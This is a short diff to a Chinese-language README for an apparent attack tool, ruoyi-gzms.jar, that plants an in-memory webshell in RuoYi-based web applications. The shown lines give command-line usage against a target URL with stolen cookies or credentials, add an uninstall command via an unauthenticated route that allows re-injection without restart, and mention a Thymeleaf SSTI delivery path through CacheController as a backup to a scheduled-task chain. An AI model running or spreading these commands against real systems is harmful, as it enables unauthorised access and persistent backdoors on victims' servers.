@@ -44,6 +44,8 @@ java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
 
 ```bash
 java -jar ruoyi-gzms.jar --url http://target:8080 --user U --pass P --mode check
+# 卸载内存马（anon 路由无需凭证；卸载后同 JVM 可直接重注，无需重启）
+java -jar ruoyi-gzms.jar --url http://target:8080 --mode uninstall
 ```
 
 `--mode ssti` 走 Thymeleaf SSTI（CacheController `fragment` 注入），与定时任务链完全独立、互为备份。投递三选一：
